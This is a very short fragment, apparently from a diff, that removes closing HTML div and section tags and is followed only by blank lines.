-    </div>
-  </section>
-
 
           
         
